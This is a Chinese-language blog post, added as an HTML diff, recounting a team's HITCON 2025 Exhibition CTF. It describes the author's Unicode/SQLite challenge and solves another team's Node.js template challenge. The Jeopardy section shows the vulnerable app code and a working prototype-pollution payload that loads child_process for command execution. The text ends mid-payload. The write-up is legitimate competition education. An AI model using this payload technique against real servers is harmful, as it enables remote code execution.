@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Before allrk.3&#x2F;Team: ICEDTEA   今年跟以往一般的 FINAL 不太一樣，重新辦回國內惹，取預賽前四名 + AIS3 教育部那邊推兩隊，然後賽制改成 Belluminar（各隊伍互相出題互相打，要控制好難度一題難一題簡單） + Live CTF (eSports)   計分機制也不是單純的總分 而是 Belluminnar - Jeopardy, Bellum">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HITCON 2025 Exhibition CTF 隨筆">
+<meta property="og:url" content="http://wha13.github.io/2025/10/22/hitcon-final-2025/index.html">
+<meta property="og:site_name" content="Whale120&#39;s Blog">
+<meta property="og:description" content="Before allrk.3&#x2F;Team: ICEDTEA   今年跟以往一般的 FINAL 不太一樣，重新辦回國內惹，取預賽前四名 + AIS3 教育部那邊推兩隊，然後賽制改成 Belluminar（各隊伍互相出題互相打，要控制好難度一題難一題簡單） + Live CTF (eSports)   計分機制也不是單純的總分 而是 Belluminnar - Jeopardy, Bellum">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkFV5oQRxe.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/William957-web/Daily/refs/heads/main/20251018_180033.webp">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyIgivmRle.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Bk0vswm0lg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HkS9QcQRee.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/William957-web/Daily/refs/heads/main/20251016_160529.jpg">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJ0wEhXRge.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1fxB3XRge.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1J6Hn7Clx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HkMDL27Rxg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1HmrAHRxg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1vJ5ABCeg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ByYFly8Cle.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJZjx1UAxx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1rXb1URle.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ryFnZ1ICxg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkBKnaSCxx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJ7cv-LRel.png">
+<meta property="article:published_time" content="2025-10-22T16:01:08.000Z">
+<meta property="article:modified_time" content="2025-10-22T07:53:02.017Z">
+<meta property="article:author" content="William Lin">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="HITCON">
+<meta property="article:tag" content="Cryptography">
+<meta property="article:tag" content="prototype pollution">
+<meta property="article:tag" content="ICEDTEA">
+<meta property="article:tag" content="LiveCTF">
+<meta property="article:tag" content="Belluminar">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/SkFV5oQRxe.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HITCON 2025 Exhibition CTF 隨筆</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/10/19/qnqsec-ctf-2025/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2025/10/22/hitcon-final-2025/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2025/10/22/hitcon-final-2025/&text=HITCON 2025 Exhibition CTF 隨筆"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2025/10/22/hitcon-final-2025/&title=HITCON 2025 Exhibition CTF 隨筆"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2025/10/22/hitcon-final-2025/&is_video=false&description=HITCON 2025 Exhibition CTF 隨筆"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HITCON 2025 Exhibition CTF 隨筆&body=Check out this article: http://wha13.github.io/2025/10/22/hitcon-final-2025/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2025/10/22/hitcon-final-2025/&title=HITCON 2025 Exhibition CTF 隨筆"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2025/10/22/hitcon-final-2025/&title=HITCON 2025 Exhibition CTF 隨筆"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2025/10/22/hitcon-final-2025/&title=HITCON 2025 Exhibition CTF 隨筆"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2025/10/22/hitcon-final-2025/&title=HITCON 2025 Exhibition CTF 隨筆"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2025/10/22/hitcon-final-2025/&name=HITCON 2025 Exhibition CTF 隨筆&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2025/10/22/hitcon-final-2025/&t=HITCON 2025 Exhibition CTF 隨筆"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access"><span class="toc-number">2.</span> <span class="toc-text">Initial Access</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Belluminar-Challenge-prepare"><span class="toc-number">2.1.</span> <span class="toc-text">Belluminar - Challenge prepare</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-0"><span class="toc-number">3.</span> <span class="toc-text">Day 0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-1"><span class="toc-number">4.</span> <span class="toc-text">Day 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Jeopardy"><span class="toc-number">4.1.</span> <span class="toc-text">Jeopardy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Live-CTF-eSports"><span class="toc-number">4.2.</span> <span class="toc-text">Live CTF (eSports)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Derby"><span class="toc-number">4.2.1.</span> <span class="toc-text">Derby</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Baby-MAC"><span class="toc-number">4.2.2.</span> <span class="toc-text">Baby MAC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Tower-Defense"><span class="toc-number">4.2.3.</span> <span class="toc-text">Tower Defense</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-1-Day-2"><span class="toc-number">5.</span> <span class="toc-text">Day 1 ~ Day 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-2"><span class="toc-number">6.</span> <span class="toc-text">Day 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Live-CTF-eSports-1"><span class="toc-number">6.1.</span> <span class="toc-text">Live CTF (eSports)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B3%BD%E5%BE%8C%E5%88%86%E4%BA%AB"><span class="toc-number">6.2.</span> <span class="toc-text">賽後分享</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#After-Party"><span class="toc-number">6.3.</span> <span class="toc-text">After Party</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">7.</span> <span class="toc-text">After all</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HITCON 2025 Exhibition CTF 隨筆
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">William Lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-10-22T16:01:08.000Z" class="dt-published" itemprop="datePublished">2025-10-22</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Belluminar/" rel="tag">Belluminar</a>, <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/Cryptography/" rel="tag">Cryptography</a>, <a class="p-category" href="/tags/HITCON/" rel="tag">HITCON</a>, <a class="p-category" href="/tags/ICEDTEA/" rel="tag">ICEDTEA</a>, <a class="p-category" href="/tags/LiveCTF/" rel="tag">LiveCTF</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/prototype-pollution/" rel="tag">prototype pollution</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>rk.3&#x2F;Team: ICEDTEA  </p>
+<p>今年跟以往一般的 FINAL 不太一樣，重新辦回國內惹，取預賽前四名 + AIS3 教育部那邊推兩隊，然後賽制改成 Belluminar（各隊伍互相出題互相打，要控制好難度一題難一題簡單） + Live CTF (eSports)  </p>
+<p>計分機制也不是單純的總分 而是 Belluminnar - Jeopardy, Belluminar 出題 + 報告, eSports 各三分之一  </p>
+<p><del>忍不住講一下，僅個人發言：這次 eSports 占分太重了我覺得，很容易讓整場變成 eSports 定生死但偏偏那就不是主要考技術的項目</del>  </p>
+<p>先來點照片 XD，感謝這次一起打比賽的隊員們以及用心的主辦方（HITCON 耶拜託），玩得很開心  XDD  </p>
+<p>而且即便如此也不影響它絕對依然是全台最盛大的駭客賽事！  </p>
+<p><img src="https://hackmd.io/_uploads/SkFV5oQRxe.png" alt="image">  </p>
+<p><img src="https://raw.githubusercontent.com/William957-web/Daily/refs/heads/main/20251018_180033.webp" alt="大合照">  </p>
+<h2 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h2><p>首先當然是先通過預賽緊接著三個台灣老隊伍拿到台灣第四進決賽，那場其實打得頗驚險因為賽前發現一堆平常隊上主力不是有事，就是先被拉去了隔壁大聯隊，包含我自己那兩天也被 YTP 和 CPTS 折磨得死去活來 lol。  </p>
+<p>但總之是通過了，於是我們就開始了隊內的報名機制，確定有誰是要打決賽的  </p>
+<p><img src="https://hackmd.io/_uploads/HyIgivmRle.png" alt="image">  </p>
+<p>欸，公開資訊表單忘了設計 list 怎麼辦<br>欸我隊上是一群 hacker 耶，<del>設計一個 sqli 進去就好</del>  </p>
+<p><img src="https://hackmd.io/_uploads/Bk0vswm0lg.png" alt="image">  </p>
+<p>當然咯，短暫的討論後我們決定以大部分中大型戰隊遇到大型&#x2F;重要實體賽事時會採用的 現場 + 現場周圍遠端支援 + 線上遠端支援 的形式去進行比賽！  </p>
+<p><img src="https://hackmd.io/_uploads/HkS9QcQRee.png" alt="image">  </p>
+<p><strong>Let’s go~</strong><br>修但，不是說好是打 Belluminar 嗎，題目咧？  </p>
+<h3 id="Belluminar-Challenge-prepare"><a href="#Belluminar-Challenge-prepare" class="headerlink" title="Belluminar - Challenge prepare"></a>Belluminar - Challenge prepare</h3><p>放到這邊惹：<br><a target="_blank" rel="noopener" href="https://github.com/William957-web/My-CTF-Challenges/tree/main/hitcon_exhibition/2025">https://github.com/William957-web/My-CTF-Challenges/tree/main/hitcon_exhibition&#x2F;2025</a>  </p>
+<p>要玩可以去：<a target="_blank" rel="noopener" href="https://daemonslayer.whale-tw.com/login">https://daemonslayer.whale-tw.com/login</a>  </p>
+<p>賽後分享的簡報：<a target="_blank" rel="noopener" href="https://www.canva.com/design/DAG2DtLTAco/X7y52HLuG0qI8pitfO5Ngw/edit?utm_content=DAG2DtLTAco&utm_campaign=designshare&utm_medium=link2&utm_source=sharebutton">https://www.canva.com/design/DAG2DtLTAco/X7y52HLuG0qI8pitfO5Ngw/edit?utm_content&#x3D;DAG2DtLTAco&amp;utm_campaign&#x3D;designshare&amp;utm_medium&#x3D;link2&amp;utm_source&#x3D;sharebutton</a>  </p>
+<p>分享一下 intended 作法和題目內容～<br>簡言之就是一個抽卡網站，會先讓使用者註冊帳號後，上線就送 50 塊錢可以抽卡一次，另外就是架構是 Python Flask + SQLite<br>抽卡ㄉ機制是使用者端產生一個隨機向量跟矩陣去做乘法，基本上就是一個很脆弱的 VRF，有把 secret_array 和一個 pub_vector，公鑰是 pub_vector * secret_array 和 pub_array，最後 secret_array * input_vector &#x3D; 結果<br>基本上就是利用 secret_array 對兩個向量乘法順序不改變最終值的特性來驗證，另外就是也有提供 secret_array，玩家玩到 secret_array 大小次數後自己能線性解出他  </p>
+<p>但這東西超脆弱，不論是輸入大向量直接 LLL 一把梭或者因為我數字夠小，有空間可以 <code>[A, A^2, A^3]</code> … 去做大數字 A 的 A 進制還原每個值都可以 LEAK SECRET_ARRAY。<br>拿 flag 要把 secret_array 第一排送過去當 input  </p>
+<p>但反正那時候我看隊友要出好噁心的 pwn 我就轉頭捏 easy 了，可以發現這個攻擊到拿 flag 只有抽卡一次一定不夠！<br>這題的第二個特性是 Python 與 SQLITE 的 lower 函數轉換表在我限制的 lower 出來是 ascii.printable 範圍內都還是有不一致，導致一個同名帳號可多次被註冊，錢錢就被多發了！<br>那是哪裡不一致了呢～？<br>ANS:  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chr</span>(<span class="number">8490</span>).lower() == <span class="string">&#x27;K&#x27;</span>.lower() <span class="comment"># 就是一般你認知的 k</span></span><br></pre></td></tr></table></figure>
+<p>但 SQLITE 對這個 8490 長得像 K 的字元 (Kelvin Sign) 並沒有特別的 LOWER 對照。  </p>
+<p>不過這題除了星爆吉娃娃的 @itiscaleb Web 第一步也是不一致，另外解出的三隊在 copilot 的幫助下都使用 SQLITE 對讀取和寫入 lock 的分離之 Race Condition 觸發了錢錢漏洞（嘆），小小 unintended。<br><del>啊至於 @curious 漏看了條件導致做了更難的 Crypto 題又是另一個故事了</del>  乁( ˙ω˙ )厂  </p>
+<p>我隊友 ZK 的噁心檔案上傳 http server heap pwn 題又又又是另一個故事了 XD  </p>
+<p>好啦，至此，人、飯店、題目、infra （對的，我們隊上最不缺的就是 infra 感謝各位神人）都已經齊全了，真的可以 Let’s go!  </p>
+<h2 id="Day-0"><a href="#Day-0" class="headerlink" title="Day 0"></a>Day 0</h2><p>提早去飯店場布&#x2F;最後 final check 題目<br><del>但我因為三四點就要 CHECKIN 但人幾乎都還沒到就跑去隔壁安麗美特玩了</del><br>當然 我們隊上另一種最不缺的東西就是宅宅，所以這幾天裡我們也去了好幾次安美 XDDD  </p>
+<p><img src="https://raw.githubusercontent.com/William957-web/Daily/refs/heads/main/20251016_160529.jpg" alt="https://raw.githubusercontent.com/William957-web/Daily/refs/heads/main/20251016_160529.jpg">  </p>
+<p><del>測量自己的身高，用凜太郎的等身立牌</del>  </p>
+<p><img src="https://hackmd.io/_uploads/SJ0wEhXRge.png" alt="image"></p>
+<p>好啦拉回主題，第零天當然就是佈置 infra  </p>
+<p>主要是要打 tunnel 到會場讓場外組可以用 vpn 通到現場，直連題目  </p>
+<p>雖然但是 其實本來有這個環節是為了應對 A&amp;D ，蠻可惜今年沒有的，不然又會是另一種風景w，詳細可以看我去年的 wp <a target="_blank" rel="noopener" href="https://blog.whale-tw.com/2024/11/10/hitcon-final-2024/">(link)</a>  </p>
+<p><img src="https://hackmd.io/_uploads/B1fxB3XRge.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/S1J6Hn7Clx.png" alt="image"></p>
+<p>Day 0 其他…應該就沒什麼好講了 XD</p>
+<h2 id="Day-1"><a href="#Day-1" class="headerlink" title="Day 1"></a>Day 1</h2><p>其實前一天晚上大家都忙活到好晚，反而是我算很早睡了不然隔天真的會沒力氣比賽 XD<br>早上起床後：<br>看向床下的方向：不對，為什麼那兩個人還在打電腦（p23, zk），結果最後發現他們倆還在重排我們交上去的 pwn 題的 exploit 的 FSOP ??<br>辛苦隊友了 orz …  </p>
+<p>於是我跟 Fishbaby 和 Kohiro 就先跑去買早餐惹，順便幫兩位大大帶，其他人就先睡覺  </p>
+<p>會場，每個 隊伍都有自己的一個小方桌和線材  </p>
+<p><img src="https://hackmd.io/_uploads/HkMDL27Rxg.png" alt="image"></p>
+<p>然後就開始打比賽了，由於我們預測了兩隊推薦隊伍的題目應該比較簡單，我就把他們交給隊上線上組經驗沒那麼多的選手處理，我先去開了星爆的 <code>Useless Template Renderer</code></p>
+<h3 id="Jeopardy"><a href="#Jeopardy" class="headerlink" title="Jeopardy"></a>Jeopardy</h3><p>聽 @itiscaleb 說是某題 SECCON CTF 的加難版？<br>反正撇除我的怪題有點難評，這題確實是全場最難 web 題了  </p>
+<p>簡單說，給你一個 Prototype Pollution 和一個 free input，如果 input 字元不 match </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code.<span class="title function_">match</span>(<span class="regexp">/[a-zA-Z!@#$=&#123;&#125;;:&#x27;&quot;`~,?\\_]/g</span>)</span><br></pre></td></tr></table></figure>
+<p>就會進 eval 被執行  </p>
+<p><strong>app.js</strong>  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;))</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">renderTemplate</span>(<span class="params">template, context = &#123;&#125;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> template.<span class="title function_">replace</span>(<span class="regexp">/&#123;&#123;(.*?)&#125;&#125;/g</span>, <span class="function">(<span class="params">_, code</span>) =&gt;</span> &#123;</span><br><span class="line">        code = code.<span class="title function_">trim</span>()</span><br><span class="line">        <span class="keyword">if</span> (code.<span class="title function_">match</span>(<span class="regexp">/[a-zA-Z!@#$=&#123;&#125;;:&#x27;&quot;`~,?\\_]/g</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> context[code] ?? <span class="string">&quot;???&quot;</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">eval</span>(code);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;???&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">target, result = &#123;&#125;</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> [key, value] <span class="keyword">of</span> <span class="title class_">Object</span>.<span class="title function_">entries</span>(target)) &#123;</span><br><span class="line">        <span class="comment">/* What is the point of number key? */</span></span><br><span class="line">        <span class="keyword">if</span> (key.<span class="title function_">toString</span>().<span class="title function_">match</span>(<span class="regexp">/\d/</span>)) <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (value &amp;&amp; <span class="keyword">typeof</span> value == <span class="string">&quot;object&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!(key <span class="keyword">in</span> result)) result[key] = &#123;&#125;;</span><br><span class="line">            <span class="title function_">clone</span>(value, result[key]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result[key] = value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/render&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> template = req.<span class="property">body</span>.<span class="property">template</span> ?? <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">let</span> context = &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">context</span>)</span><br><span class="line">        context = <span class="title function_">clone</span>(<span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">body</span>.<span class="property">context</span>))</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">send</span>(<span class="title function_">renderTemplate</span>(template, context))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(<span class="string">&quot;index.html&quot;</span>, &#123; <span class="attr">root</span>: __dirname &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">48763</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;servert started&quot;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>大概看著他想了一兩個小時左右，首先是 prototype pollution 不能直接 <code>[__proto__]</code> 蓋過去因為 js 裡面不會把 <code>__proto__</code> method 算進去 <code>Object.entries()</code>，<code>__proto__</code> 內部的物件也是不可遍歷的，所以要改用 <code>[consturctor][prototype]</code> 的方法去蓋掉 prototype<br>再來是字元限制，printable 範圍內就是 <code>[], (), &#123;&#125;, 0~9, +, -, .</code> 這些，聽起來很 JSFuck 但不是因為 <code>!</code> 被 ban 了  </p>
+<p>等等，剛剛有人說 printable 嗎，試一下會發現 <code>\xff</code>, <code>\xfe</code>, <code>\xfd</code> 其實都可以正常拿來當 js 變數的名稱，最後我的想法就是套用<br>從 array 取到 constructor，再讓以字串去定義新函數來呼叫的 Payload type 做事情  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[][<span class="string">&quot;filter&quot;</span>][<span class="string">&quot;constructor&quot;</span>]</span><br><span class="line">[][<span class="string">&quot;filter&quot;</span>][<span class="string">&quot;constructor&quot;</span>](<span class="string">&quot;console.log(1)&quot;</span>)()</span><br></pre></td></tr></table></figure>
+<p>也就是做一半的 JSFuck，再把需要的字串都換成剛剛前面奇奇怪怪的變數名稱，最後用 Prototype Pollution 蓋掉就好  </p>
+<p>Input:  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[][ÿ][þ](ý)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>Payload:  </p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;ÿ&quot;</span><span class="punctuation">:</span><span class="string">&quot;filter&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;þ&quot;</span><span class="punctuation">:</span><span class="string">&quot;constructor&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;ý&quot;</span><span class="punctuation">:</span><span class="string">&quot;return Function(&#x27;return process.mainModule.constructor._load(\&quot;child_process\&quot;)&#x27;)().execSync(&#x27;cat 